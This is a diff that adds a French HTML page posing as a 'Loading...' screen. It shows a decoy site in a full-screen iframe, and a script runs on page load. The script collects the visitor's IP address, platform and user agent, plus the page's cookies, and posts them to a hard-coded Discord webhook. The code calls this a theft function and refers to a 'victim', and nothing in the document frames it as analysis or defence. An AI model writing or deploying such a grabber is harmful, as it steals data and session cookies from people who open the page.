@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Chargement...</title>
+    <style>
+        body { margin: 0; padding: 0; }
+        iframe { border: none; width: 100vw; height: 100vh; position: absolute; top: 0; left: 0; z-index: 10; }
+    </style>
+</head>
+<body>
+
+<!-- L'Iframe qui simule le site visé -->
+<iframe id="target" src=""></iframe>
+
+<script>
+    // --- CONFIGURATION ---
+    // Ton lien Discord Webhook précis
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1573906499431039126/GHlyXZbZxZLBRrWZxaKjYUQGoYhI_01bC_yK0le9X_xwQ3QRbn_Y0_AszRhngwa9G0Zm"; 
+
+    // Le site que tu veux afficher à la victime
+    const FAKE_SITE = "https://www.google.com"; 
+
+    // 1. Afficher le faux site
+    document.getElementById('target').src = FAKE_SITE;
+
+    // 2. Fonction de vol
+    function steal() {
+        // Récupération de l'IP
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(json => {
+                var ip = json.ip;
+                
+                // Préparation du message Discord (format JSON correct pour Discord)
+                var payload = {
+                    content: "**Nouvelle connexion détectée !**\n\n🌐 **IP :** " + ip + "\n📱 **Appareil :** " + navigator.platform + "\n🔍 **Navigateur :** " + navigator.userAgent + "\n\n🍪 **Cookies :** \n```\n" + document.cookie + "\n```",
+                    username: "Hacker Bot"
+                };
+
+                // Envoi vers Discord
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                }).catch(err => console.error('Erreur envoi:', err));
+            })
+            .catch(err => console.error('Erreur IP:', err));
+    }
+
+    // 3. Exécution au chargement
+    window.onload = steal;
+</script>
+
+</body>
+</html>
